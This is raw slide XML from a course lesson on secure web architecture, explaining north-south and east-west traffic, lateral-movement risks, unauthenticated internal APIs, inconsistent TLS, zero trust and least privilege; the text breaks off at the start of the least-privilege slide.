        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2992064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04942-3EEA-7246-7849-A1512D97A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4E1A9-3565-9815-7BE3-38C69D445B1B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1313597"/>
            <a:ext cx="10515600" cy="4237977"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lesson 02 –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Secure Web Architecture Refresher </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="Cambria"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Topic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 02 – </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
              </a:rPr>
              <a:t>East-West traffic, Zero Trust, Least Privilege</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Cambria"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36002869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9B89-E81F-A744-2656-3CBD7D82F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C7367-F94F-5D8B-C742-408984616D89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>North-South traffic</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5837864C-0F61-502D-8DD5-A342CDE1B092}"/>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t>North–South Traffic is traffic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> that comes into or leaves</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>your data center / network </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>from the outside world</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Think:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>User on the internet → your web server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Your app server → external API on the internet</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Branch office → HQ data center</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8923814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11355-8F58-C28B-5FE7-4C186C687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7B063-316E-3AD5-2A55-07E267C4F0AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>East-West traffic</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ADFCC7CF-223C-7440-7FE1-E342C84E9DA4}"/>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ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>East–West Traffic flows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>laterally, inside</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> the data center or LAN — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>server ↔ server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>service ↔ service</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Think:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Web server ↔ app server</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>App server ↔ database</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Microservice A ↔ Microservice B</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>VM ↔ VM in the same DC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37853083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A862A-B8BC-00C5-6B44-60F2B96CC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9E3E7-905A-8A20-901D-F476DAB1EFE8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>East-West Security Implications 01</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{75294DB7-0EE9-EE6B-476D-6653294D4801}"/>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b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Lateral movement</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Attacker compromises a container via insecure deserialization, SSRF, RCE, etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>From there they:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Scan internal DNS/service discovery for other services</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Hit internal APIs (often less hardened than the public ones)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Try to reach metadata services, databases, and admin endpoints</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="27559404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2E824-952C-2292-F298-D8D30E21E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AD1BC-47C7-566C-2C44-33C547739F67}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>East-West Security Implications 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B05773BF-2398-2110-54E2-80138503CED2}"/>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Exposed internal APIs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Internal endpoints often:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Lack strict auth.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" indent="-457200"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Assume only trusted callers.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Example: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>GET /internal/export-all-users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> behind no auth, because “only reporting-service calls this.”</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31663558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E8299-61B0-64D2-6A0E-34EA8FEC3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E91C0-39B5-9668-875A-319F32D15F77}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>East-West Security Implications 03</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AA6486B5-EE3D-4656-5EF1-6F8A504B11D3}"/>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Inconsistent TLS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Some internal calls use TLS, some don’t.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Certificates are managed manually (copy-paste, long-lived certs).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Easy to end up with:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Stale, weak ciphers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Expired certificates</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Misconfigurations that break encryption guarantees</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18308545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9C85-8550-DF07-0BCB-DEEBBBC35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A82E3-4B24-1A6C-4F24-F991194B0F4F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>East-West Security Implications 04</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A96F7B44-4BEC-EE2F-8692-2DB7CF23D62C}"/>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Lack of visibility</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>If you can’t easily answer “Who called the payment-service in the last 24 hours?” you can’t do effective incident response.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7794993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6320D-2BE6-F9F4-39ED-CB14133E4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043E9-CAEA-E55A-74AA-F9D9A607E4CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Zero Trust Architecture</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2859D0C8-4C62-7F77-5A23-1F9CB67BA035}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7958082" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Zero trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> is a security philosophy that assumes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>no implicit trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> based on network location or ownership, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>continuously verifies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> every user, device, and workload before granting access to resources.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Slogan:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>“Never trust, always verify.”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4290149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3D4F-607D-6DB6-E62E-4E3FF4EA1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9FE88-FA1A-ADE8-A3E4-5CE01E3F73C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.2 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>the Principle of Least Privilege (POLP)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E85AECC-0805-00EF-0455-C9944720CD2A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="6609256" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
